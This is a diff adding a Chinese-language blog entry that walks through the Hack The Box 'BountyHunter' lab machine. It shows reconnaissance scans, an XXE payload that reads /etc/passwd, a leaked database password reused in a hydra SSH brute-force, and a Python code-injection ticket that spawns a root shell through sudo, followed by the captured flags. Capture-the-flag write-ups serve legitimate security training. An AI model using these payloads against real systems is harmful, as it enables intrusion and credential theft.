@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>BountyHunter</title>
+    <link href="/2021/10/18/BountyHunter/"/>
+    <url>/2021/10/18/BountyHunter/</url>
+    
+    <content type="html"><![CDATA[<hr><pre><code>wp参考： https://blog.csdn.net/weixin_47156475/article/details/119672224给的目标靶机10.10.11.100</code></pre><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/dhRf8uF6OwqCzET.png" alt="image.png"></h2><pre><code>nmap -sV -T4 -A 10.10.11.100  扫描结果</code></pre><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/GKiBoweQNUbxIc9.png" alt="image.png"></h2><pre><code>进网页看看，不是什么cms，</code></pre><hr><pre><code>gobuster 扫描一下目录</code></pre><h2 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/6hcwvZiktBGUnJ9.png"></h2><pre><code>nikto -h 10.10.11.100  发现3个php的文件db.php这个在后面有大用</code></pre><p><img src="https://i.loli.net/2021/10/18/ntYaGBHOep9ug7Q.png"><br><img src="https://i.loli.net/2021/10/18/aJucf7CqNeyBrQj.png"></p><hr><pre><code>readme.txt 也没有什么可用信息</code></pre><h2 id="-3"><a href="#-3" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/ixFJ6eSXKWEV9bI.png"></h2><pre><code>然后开始在网站到处点，看看有没有什么后台，找找上传瞎几把点，点到一个这个玩意儿</code></pre><h2 id="-4"><a href="#-4" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/HcoRwZ2F6tmvgaO.png"></h2><pre><code>好像是提交参数的东西，抓包看下，应该是base64 解密看下</code></pre><h2 id="-5"><a href="#-5" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/3z1j8sJvInYaSrq.png" alt="image.png"></h2><pre><code>应该是base64 解密看下</code></pre><p><img src="https://i.loli.net/2021/10/18/1CzSY7X8yVZDIMr.png"><br><img src="https://pic.imgdb.cn/item/616d11802ab3f51d919b0fb6.jpg"></p><hr><pre><code>&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;    &lt;bugreport&gt;    &lt;title&gt;a&lt;/title&gt;    &lt;cwe&gt;b&lt;/cwe&gt;    &lt;cvss&gt;c&lt;/cvss&gt;    &lt;reward&gt;d&lt;/reward&gt;    &lt;/bugreport&gt;</code></pre><hr><pre><code>xml有点熟悉啊，思路好像清晰了，这个靶机应该考的xxe参考wp访问一下/etc/passwd</code></pre><h2 id="-6"><a href="#-6" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d12bc2ab3f51d919c21ff.jpg"></h2><pre><code>&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE data [ &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;    &lt;bugreport&gt;    &lt;title&gt;test&lt;/title&gt;    &lt;cwe&gt;test&lt;/cwe&gt;    &lt;cvss&gt;test&lt;/cvss&gt;    &lt;reward&gt;&amp;file;&lt;/reward&gt;    &lt;/bugreport&gt;</code></pre><hr><pre><code>PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRhdGEgWyA8IUVOVElUWSBmaWxlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj5dPgoJCTxidWdyZXBvcnQ</code></pre><hr><pre><code>解密结果</code></pre><hr><pre><code>&lt;?php// TODO -&gt; Implement login system with the database.$dbserver = &quot;localhost&quot;;$dbname = &quot;bounty&quot;;$dbusername = &quot;admin&quot;;$dbpassword = &quot;m19RoAU0hP41A1sTsq6K&quot;;$testuser = &quot;test&quot;;?&gt;</code></pre><hr><pre><code>用这个账号密码尝试ssh登录ssh admin@10.10.11.100登录不上。。用刚刚的保存的文件生成一个密码字典cut -d : -f 1 passwd &gt;user</code></pre><hr><pre><code>用九头蛇看能不能爆破进去hydra -L user -p m19RoAU0hP41A1sTsq6K 10.10.11.100 ssh</code></pre><h2 id="-7"><a href="#-7" class="headerlink" title=""></a><a href="https://pic.imgdb.cn/item/616d12c72ab3f51d919c2be7"></a></h2><pre><code>爆破出来了ssh development@10.10.11.100  m19RoAU0hP41A1sTsq6Kssh连上了，普通权限看wp的尝试提权</code></pre><h2 id="-8"><a href="#-8" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d12cc2ab3f51d919c3080.jpg"></h2><pre><code>ec598c30b683202dbda87c5b7b3e108c</code></pre><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><hr><pre><code>sudo -l看看是否有什么可以提取权限的方法，并且查看一下可以提权的文件</code></pre><h2 id="-9"><a href="#-9" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d12d12ab3f51d919c34c0.jpg"></h2><pre><code>一个py文件，应该就是用它来提权了，python还是有点拉，大概能看懂，写不出来写一个.md文件，修改一个反弹shell</code></pre><h2 id="-10"><a href="#-10" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d12d42ab3f51d919c37c6.jpg"></h2><pre><code># Skytrain Inc   ## Ticket to root  __Ticket Code:__  **102+ 10 == 112 and __import__(&#39;os&#39;).system(&#39;/bin/bash&#39;) == False </code></pre><h2 id="-11"><a href="#-11" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d12db2ab3f51d919c3e73.jpg"></h2><pre><code>1622fdb053418ba4935b17acccc77a12</code></pre><p><img src="https://pic.imgdb.cn/item/616d12e22ab3f51d919c4602.jpg"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Hack The Box</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Hack The Box</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>记一次新手的内网渗透</title>
     <link href="/2021/09/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%96%B0%E6%89%8B%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
     <url>/2021/09/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%96%B0%E6%89%8B%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
